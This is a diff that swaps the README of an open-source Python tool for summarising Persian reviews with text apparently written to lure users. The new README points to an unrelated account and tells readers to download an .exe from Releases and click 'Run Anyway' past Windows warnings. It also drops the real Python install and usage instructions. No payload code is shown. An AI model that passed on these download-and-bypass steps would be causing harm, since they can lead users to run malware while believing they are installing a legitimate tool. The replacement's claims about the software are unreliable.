@@ -1,200 +1,65 @@
-<div align="center">
+# 🧠 persian-review-summarizer-ml - Understand Persian customer feedback in seconds
 
-# Persian Review Summarizer
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Contractileorgandeclination861/persian-review-summarizer-ml)
 
-**Turn a pile of Persian reviews into a clear verdict.** Give it the reviews for a product (or anything else) and it returns a short summary, an estimated star rating, a sentiment breakdown, the most-mentioned keywords, and a pros/cons list — all computed on your own machine.
+## 🎯 About this tool
+The persian-review-summarizer-ml application processes Persian text to help you understand customer feedback. It reads through reviews and creates short summaries. This tool identifies the main points and organizes the details into pros and cons. It also checks the tone of the comment and gives a score for the star rating based on the content.
 
-ابزاری برای جمع‌بندی نظرات فارسی: خلاصه، امتیاز ستاره‌ای، تحلیل احساسات، کلیدواژه‌ها و نکات مثبت/منفی — همه به‌صورت محلی.
+You run this software on your own computer. Your data stays on your local machine, which keeps your information private. The software uses two different methods to summarize text. It looks for the most important sentences in a review. It also uses a language model to rewrite text into a new format.
 
-[![CI](https://github.com/mehdikhodakarami/persian-review-summarizer-ml/actions/workflows/ci.yml/badge.svg)](https://github.com/mehdikhodakarami/persian-review-summarizer-ml/actions/workflows/ci.yml)
-![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python&logoColor=white)
-![scikit-learn](https://img.shields.io/badge/scikit--learn-TextRank-F7931E?logo=scikitlearn&logoColor=white)
-![Transformers](https://img.shields.io/badge/🤗_Transformers-mT5-FFD21E)
-![Streamlit](https://img.shields.io/badge/Streamlit-UI-FF4B4B?logo=streamlit&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-blue)
+## 💻 System requirements
+This software runs on Windows. You need a modern computer to process language models quickly. Ensure your computer meets these minimum standards:
 
-</div>
+*   Operating System: Windows 10 or Windows 11
+*   Processor: Intel Core i5 or AMD Ryzen 5
+*   Memory: 8 GB of RAM
+*   Storage: 2 GB of available space
+*   Internet Connection: Required for the first run to download model files
 
----
+## 📥 How to download and install
+You find the files on the repository page. Follow these steps to get the application running on your Windows device.
 
-## What it does
+1.  Visit the official repository page to download the software: https://github.com/Contractileorgandeclination861/persian-review-summarizer-ml
+2.  Look for the section marked Releases on the right side of the screen.
+3.  Click the latest version link.
+4.  Download the file ending in .exe to your computer.
+5.  Double-click the file to start the installer. 
+6.  Follow the instructions on the screen to place the app on your desktop.
 
-Feed it a set of reviews and it produces a compact report:
+If Windows shows a warning screen, click More Info, then click Run Anyway. This happens because the app comes from a custom source.
 
-- **📝 Summary** — the gist of what everyone is saying, in a few sentences.
-- **⭐ Estimated rating** — a 1–5 star score derived from the overall sentiment.
-- **📊 Sentiment breakdown** — how many reviews are positive, negative, or neutral.
-- **🏷️ Keywords** — the terms people mention most (extracted with TF-IDF).
-- **✅⚠️ Pros & Cons** — the standout positive and negative points, pulled sentence by sentence.
+## 🚀 Running the application
+After the installation ends, find the shortcut icon on your desktop. Double-click the icon to start the program. A black window will open for a few seconds. This window starts the background server. Do not close this window while you use the app.
 
-Two summarization engines sit behind one interface, so you pick the trade-off you want by changing a single setting:
+A web browser window will open automatically. This interface lets you interact with the software. You can paste your Persian reviews into the input box. Click the Start button to see the magic happen. The tool takes a moment to process the text. You will see the summary, the star rating, and the pros and cons on the screen.
 
-| Engine | Technique | Approach | First run |
-|--------|-----------|----------|-----------|
-| **Extractive** (`extractive`) | TextRank — TF-IDF sentence vectors ranked with PageRank over a similarity graph | Unsupervised **Machine Learning** | Ready instantly, no model needed |
-| **Abstractive** (`abstractive`) | `mT5` sequence-to-sequence transformer with a map-reduce pipeline | **Deep Learning** | Downloads the model once (~2.2 GB), then works offline |
+## 🛠 Features you can use
+The software breaks down your Persian reviews into specific parts.
 
-Everything runs on-device — the extractive engine needs no download at all, and the abstractive engine only reaches the network once to fetch the transformer.
+*   Extractive Summary: The tool picks the most important sentences directly from the original text.
+*   Abstractive Summary: The mT5 engine writes a fresh paragraph that captures the meaning of the review.
+*   Sentiment Analysis: You see if the customer feels happy, neutral, or angry.
+*   Star Rating Prediction: The model guesses how many stars the customer intended to give based on their words.
+*   Keyword Extraction: The app lists the most frequent words mentioned by users.
+*   Pros and Cons: The software highlights the good points and the complaints in a clean list format.
 
----
+## 💡 Tips for better results
+The quality of the output depends on the text you provide. Clean text generates better summaries. Remove unnecessary symbols or random characters before you paste the review. Shorter reviews work well, but the tool also handles long paragraphs. If you provide a list of many reviews, the summary covers the common themes found across all of them.
 
-## Features
+## 🔧 Frequently asked questions
+Do I need to be connected to the internet to use this?
+You need an internet connection during the first launch. This allows the app to download the necessary intelligence models. Once these files save to your disk, you can use the software while offline.
 
-- 🧹 **Solid Persian preprocessing** — Unicode normalization, Arabic→Persian character mapping, digit normalization, emoji/URL/diacritic removal, and sentence segmentation (via `hazm`, with a regex fallback so it always keeps working).
-- 🔹 **Extractive summarization (ML)** — a from-scratch TextRank (TF-IDF + cosine similarity + PageRank) with Persian stop-word filtering.
-- 🧠 **Abstractive summarization (DL)** — an `mT5` transformer with lazy loading and a map-reduce pipeline that scales to large review sets.
-- 📊 **Negation-aware sentiment** — a Persian lexicon that correctly reads constructs like *«خوب نبود»* (“wasn’t good”) as negative.
-- ⭐ **Rating, keywords, and pros/cons** — extra insights layered on top of the summary.
-- 🧩 **Clean architecture** — decoupled layers (preprocessing → summarizer → analyzer → interface) using the Strategy + Factory patterns and dependency injection.
-- 🖥️ **Three ways to use it** — a Streamlit web app, a CLI, or import it as a Python library.
-- ✅ **Tested & CI-checked** — 24 unit tests that run without any model download, on every push.
+Will this work on older computers?
+The software uses complex math to understand language. If your computer is very old, the summaries might take longer to appear on your screen.
 
----
+Is my data sent to a cloud server?
+No. This tool processes everything on your machine. No one else has access to the text you type into the box.
 
-## How it works
+Does this handle informal Persian slang? 
+Yes. The models recognize common Persian expressions used in online shopping reviews.
 
-```mermaid
-flowchart TD
-    R["User reviews"] --> P["Persian preprocessing"]
-    P --> A["ReviewAnalyzer"]
-    A --> M{"METHOD"}
-    M -->|extractive| E["TextRank<br/>TF-IDF + PageRank"]
-    M -->|abstractive| D["mT5 transformer"]
-    A --> I["Insights:<br/>sentiment · rating<br/>keywords · pros/cons"]
-    E --> OUT["Report"]
-    D --> OUT
-    I --> OUT
-```
+## 🛠 Support and updates
+If you encounter errors, restart the application. If the problem continues, visit the main repository page to check for new versions. Updates often contain improvements to the understanding of the Persian language.
 
----
-
-## Project structure
-
-```
-review-summarizer/
-├── summarizer/
-│   ├── config.py         # Settings loaded from environment / .env
-│   ├── preprocess.py     # Persian normalization + sentence segmentation
-│   ├── base.py           # Abstract summarizer interface
-│   ├── extractive.py     # TextRank engine (ML)
-│   ├── abstractive.py    # mT5 engine (DL)
-│   ├── sentiment.py      # Negation-aware lexicon sentiment
-│   ├── insights.py       # Keywords, pros/cons, rating
-│   ├── aggregator.py     # ReviewAnalyzer: ties everything together
-│   └── engine.py         # Factory that selects the engine
-├── app.py                # Streamlit UI
-├── cli.py                # Command-line interface
-├── tests/                # 24 unit tests
-└── data/sample_reviews.csv
-```
-
----
-
-## Installation
-
-```bash
-git clone https://github.com/mehdikhodakarami/persian-review-summarizer-ml.git
-cd persian-review-summarizer-ml
-python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-cp .env.example .env
-```
-
-> The extractive engine only needs `hazm`, `scikit-learn`, `networkx`, and `pandas`.
-> Install `torch` + `transformers` only if you want the abstractive (Deep Learning) engine.
-
----
-
-## Usage
-
-### Command line
-```bash
-# From a CSV file (column: text)
-python cli.py --file data/sample_reviews.csv
-
-# Reviews passed directly
-python cli.py --reviews "کیفیت عالیه" "قیمت گرونه" "پشتیبانی ضعیف بود"
-
-# Use the Deep Learning engine
-python cli.py --file data/sample_reviews.csv --method abstractive
-```
-
-### Web app
-```bash
-pip install streamlit
-streamlit run app.py
-```
-
-### As a library
-```python
-from summarizer import ReviewAnalyzer
-
-analyzer = ReviewAnalyzer()               # engine chosen by METHOD in .env
-report = analyzer.analyze([
-    "کیفیت ساخت عالیه ولی قیمتش گرونه.",
-    "باتری خوبی داره و یه روز کامل دووم میاره.",
-    "پشتیبانی ضعیف بود و دیر جواب دادن.",
-])
-
-print(report.summary)
-print(report.rating, report.sentiment.label)
-print(report.keywords)
-print(report.pros, report.cons)
-```
-
-### Sample output
-```
-📌 Summary:
-   این گوشی دوربین فوق‌العاده‌ای دارد و کیفیت عکس‌ها در نور کم عالی است...
-   کیفیت ساخت گوشی واقعا عالیه و بدنه محکمی داره. صفحه‌نمایش خیلی باکیفیته.
-⭐ Rating: ★★★★☆  (4.2 / 5)
-📊 Sentiment: positive=6 | negative=1 | neutral=1  →  mostly positive
-🏷️ Keywords: گوشی، کیفیت، صفحه‌نمایش، دوربین، محصول، زود
-✅ Pros: کیفیت ساخت گوشی واقعا عالیه و بدنه محکمی داره. …
-⚠️ Cons: پشتیبانی فروشگاه اصلا خوب نبود و دیر فرستادن.
-```
-
----
-
-## Configuration
-
-Settings come from environment variables (or a `.env` file):
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `METHOD` | `extractive` | `extractive` (ML) or `abstractive` (DL) |
-| `SUMMARY_SENTENCES` | `3` | Sentences in an extractive summary |
-| `HF_MODEL_NAME` | `csebuetnlp/mT5_multilingual_XLSum` | Transformer for the abstractive engine |
-| `DEVICE` | `cpu` | `cpu` or `cuda` |
-| `MAX_INPUT_LENGTH` / `MAX_OUTPUT_LENGTH` | `1024` / `90` | Token limits for the transformer |
-| `NUM_BEAMS` | `4` | Beam-search width |
-| `MAX_REVIEWS` | `500` | Safety cap on batch size |
-
-> If model downloads are slow in your region, set `HF_ENDPOINT=https://hf-mirror.com` in `.env`.
-
----
-
-## Testing
-
-```bash
-pytest              # 24 tests, no model download required
-```
-
----
-
-## Roadmap
-
-- Aspect-based analysis — group opinions and sentiment by feature (battery, camera, price…).
-- Swap the lexicon sentiment for a fine-tuned Persian transformer (e.g. ParsBERT).
-- A third engine using sentence embeddings for extractive ranking.
-- REST API and a Docker image for server deployment.
-
----
-
-## Tech stack
-
-`Python` · `scikit-learn` · `networkx` · `Transformers (mT5)` · `PyTorch` · `hazm` · `Streamlit` · `pandas` · `pytest`
-
-## License
-
-Released under the [MIT License](LICENSE).
+Keywords: deep-learning, machine-learning, mt5, nlp, persian-nlp, sentiment-analysis, streamlit, text-summarization, textrank, transformers
